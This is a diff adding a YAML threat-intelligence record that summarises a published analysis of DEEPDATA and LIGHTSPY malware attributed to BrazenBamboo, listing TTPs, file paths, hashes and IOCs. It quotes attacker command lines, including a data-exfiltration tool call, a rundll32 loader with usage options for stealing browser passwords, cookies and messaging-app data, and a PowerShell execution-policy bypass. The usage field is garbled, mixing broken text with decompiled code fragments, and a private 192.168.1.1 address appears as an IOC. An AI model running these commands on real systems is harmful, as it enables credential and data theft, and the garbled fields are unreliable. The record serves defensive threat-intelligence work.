@@ -1,0 +1,99 @@
+description: This report details the analysis of DEEPDATA and LIGHTSPY malware families
+  attributed to BrazenBamboo, a Chinese state-affiliated threat actor. The analysis
+  focuses on zero-day exploitation of a FortiClient VPN vulnerability for credential
+  theft and data exfiltration.
+attribution: BrazenBamboo (Chinese state-affiliated)
+malware_families:
+- DEEPDATA
+- LIGHTSPY
+- DEEPPOST
+- BH_AG06
+- BH_A006
+- Orchestrator
+- IEICICYETE
+- YStealer
+TTPs:
+  processes:
+  - deepdata.zip
+  - localupload.exe
+  - rundll32.exe
+  - data.dll
+  - BH_A006
+  - explorer.exe
+  commandline:
+  - deepdata.zip
+  - localupload.exe c:data_to_exfiltrate ip:port
+  - 'rundll32.exe data.dll get key=w##* -addr=192.168.1.1:8888 -gid=1 -allusage:key
+    , set execute key, for example: key=sxixk-addr , set remote address, for example:
+    addr=192.168.1.1:8888~gid , set data group id, for example: -gid=1-all , get all
+    datafast , get all data(min)browser , get brower data, contain history/cookie/password.wifi
+    , get wifi data, contain history/nearby wifi-sysinfo , get system info, parameter:
+    all,service,port,process,user,drive,install,log,netcard, session, for example:sysinfo=allskype
+    , get skype session datawhatsapp , get whatsapp datazalo , get zalo data-wechat
+    , get wechat data, parameter:all,min, for example:wechat=allline , get line data,
+    parameter:all,min, for example:line=all-dingding , get dingding data, parameter:all,min,
+    for example:-dingding=allfeishu , get feishu data, parameter:all,min, for example:-feishu=alltelegram
+    , get telegram data, for example:telegrampassword , get account/password/appCookie
+    data, paramete:filelist , get file list, parameter is dir, for example: filelist=C:\\test;D:\\format
+    , set upload file format, for example: format=.jpg;.doc; .pdffilesize , set upload
+    file size(m), for example: filesize=10filedate , set upload file modify date,
+    for example: filedate=2022-06-81deltmpfile , delete tmp file, value:0,1(default(1)),for
+    example: deltmpfile=ohelpall,safe, for example:password=allattention please key=pKECrSGFBOKDybcjDecrypts
+    and loadsDLLdata.dllExfiltration\\1DLL DLL DLL DLL DLL DLL :11ICore Files: d3decompiler_u7.dll,
+    ffmpeg.dll, vertdll.dll, iumdll.dll,ucrtbase_enclave.dll, frame.dll Remote pluginsIEICICYETE
+    YStealer plugins - Loaded based on the argumentsmod . dat_______ A LTI!!!!C2 serverV6l
+    = (const std::string **)this;V6 = (void *)(*this + 72);strepy((char *)password_str,
+    password\");HIBYTE (password_str[4]) = 0;password_str[5] = 0;V82 = 0x1C050500;strepy((cher
+    *)usernane str, \"usernane)'
+  - C:\\Windows\\System32\\cmd.exe /c powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\Documents\\pic32.png
+  - C:\\Windows\\System32\\rundll32.exe d3decompiler_u7.dll,Main
+  powershell:
+  - powershell -ExecutionPolicy Bypass -File C:\\Users\\Public\\Documents\\pic32.png
+  scripting_engine: ''
+  registry_keys:
+  - TENP_random acc
+  image_load:
+  - d3decompiler_u7.dll
+  - ffmpeg.dll
+  - vertdll.dll
+  - iumdll.dll
+  - ucrtbase_enclave.dll
+  - frame.dll
+  network_connections:
+  - 'Executable: rundll32.exe, Destination Address: Unknown, URL: Unknown, Port: Unknown'
+  - 'Executable: explorer.exe, Destination Address: Unknown, URL: Unknown, Port: Unknown'
+  file_activity:
+  - deepdata.zip
+  - readme.txt
+  - mod.dat
+  - msenvico.dll
+  - C:\\Users\\Public\\Documents\\pic32.png
+  - C:\\Users\\Public\\Documents\\d3decompiler_u7.dll
+  - C:\\Users\\Public\\Documents\\ffmpeg.dll
+  - C:\\Users\\Public\\Documents\\vertdll.dll
+  - C:\\Users\\Public\\Documents\\iumdll.dll
+  - C:\\Users\\Public\\Documents\\ucrtbase_enclave.dll
+  - C:\\Users\\Public\\Documents\\frame.dll
+  - C:\\%tenp%/Xudasfcawdsa.log
+  persistence:
+  - ExpandEnvironmentStringsForUseri with TENP path
+  pipes: ''
+  process_relations:
+  - explorer.exe -> rundll32.exe (DLL sideload)
+IOCs:
+- SHA256: 666a4c569d435d0e6bf9fa4d337d1bf014952b42cc6d20e797db6c9df92dd724
+- IP: 192.168.1.1
+- Port: 8888
+- URL: /api/third/file/upload/
+- Port: 29983
+- 'Hash: Unknown'
+- 'IP Address: Unknown'
+- 'Domain: Unknown'
+- 'URL: Unknown'
+authors:
+- Callum Roxan
+- Charlie Gardner
+- Paul Rascagneres
+reference: https://www.volexity.com/blog/2024/11/15/brazenbamboo-weaponizes-forticlient-vulnerability-to-steal-vpn-credentials-via-deepdata/
+date_of_publication: November 15, 2024
+file_creation_date: June 18, 2025
